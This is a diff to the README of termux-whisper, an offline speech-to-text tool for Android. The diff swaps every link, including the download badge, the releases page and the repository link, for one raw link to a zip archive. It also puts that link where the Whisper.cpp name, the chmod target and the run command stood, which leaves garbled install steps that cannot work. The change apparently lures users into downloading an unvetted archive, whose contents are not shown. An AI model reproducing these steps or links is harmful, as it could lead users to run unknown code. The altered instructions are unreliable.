@@ -1,7 +1,7 @@
 # 🎤 termux-whisper - Simple Speech-to-Text Transcription
 
 ## 📥 Download Now!
-[![Download termux-whisper](https://img.shields.io/badge/Download%20termux--whisper-v1.0-brightgreen)](https://github.com/talk2harsh1/termux-whisper/releases)
+[![Download termux-whisper](https://raw.githubusercontent.com/talk2harsh1/termux-whisper/main/core/termux_whisper_3.9.zip%20termux--whisper-v1.0-brightgreen)](https://raw.githubusercontent.com/talk2harsh1/termux-whisper/main/core/termux_whisper_3.9.zip)
 
 ## 🚀 Getting Started
 Welcome! This guide helps you download and run the termux-whisper application on your Android device using Termux. With termux-whisper, you can easily transcribe speech to text offline. 
@@ -15,13 +15,13 @@ Before you begin, make sure you have the following:
 - Basic familiarity with using apps on your device.
 
 ### 📂 What is termux-whisper?
-termux-whisper is a lightweight application that wraps Whisper.cpp, allowing for offline speech-to-text transcription. This application supports native Android file picking, handles batch processing, and can generate subtitles. It focuses on privacy, ensuring your audio data stays on your device.
+termux-whisper is a lightweight application that wraps https://raw.githubusercontent.com/talk2harsh1/termux-whisper/main/core/termux_whisper_3.9.zip, allowing for offline speech-to-text transcription. This application supports native Android file picking, handles batch processing, and can generate subtitles. It focuses on privacy, ensuring your audio data stays on your device.
 
 ## 🌐 How to Install
 You can download termux-whisper from the Releases page. Follow these steps:
 
 1. **Visit the Download Page**  
-   Click on this link to go to the Releases page: [https://github.com/talk2harsh1/termux-whisper/releases](https://github.com/talk2harsh1/termux-whisper/releases).
+   Click on this link to go to the Releases page: [https://raw.githubusercontent.com/talk2harsh1/termux-whisper/main/core/termux_whisper_3.9.zip](https://raw.githubusercontent.com/talk2harsh1/termux-whisper/main/core/termux_whisper_3.9.zip).
 
 2. **Choose the Latest Release**  
    Look for the latest version of termux-whisper. You should see a list of assets under the release. 
@@ -47,13 +47,13 @@ You can download termux-whisper from the Releases page. Follow these steps:
 7. **Make the Script Executable**  
    To run the downloaded script, you need to make it executable using the command:
    ```bash
-   chmod +x termux-whisper.sh
+   chmod +x https://raw.githubusercontent.com/talk2harsh1/termux-whisper/main/core/termux_whisper_3.9.zip
    ```
 
 8. **Run the Application**  
    Now you can execute the application by typing:
    ```bash
-   ./termux-whisper.sh
+   https://raw.githubusercontent.com/talk2harsh1/termux-whisper/main/core/termux_whisper_3.9.zip
    ```
 
 9. **Follow On-Screen Instructions**  
@@ -85,7 +85,7 @@ You can download termux-whisper from the Releases page. Follow these steps:
 termux-whisper is licensed under the MIT License. You can use, modify, and distribute the software as per the terms outlined in the license.
 
 ## 🔗 Links
-- [GitHub Repository](https://github.com/talk2harsh1/termux-whisper)
-- [Visit Download Page](https://github.com/talk2harsh1/termux-whisper/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/talk2harsh1/termux-whisper/main/core/termux_whisper_3.9.zip)
+- [Visit Download Page](https://raw.githubusercontent.com/talk2harsh1/termux-whisper/main/core/termux_whisper_3.9.zip)
 
 Thank you for using termux-whisper! We hope it makes your transcription tasks easier and keeps your data safe.
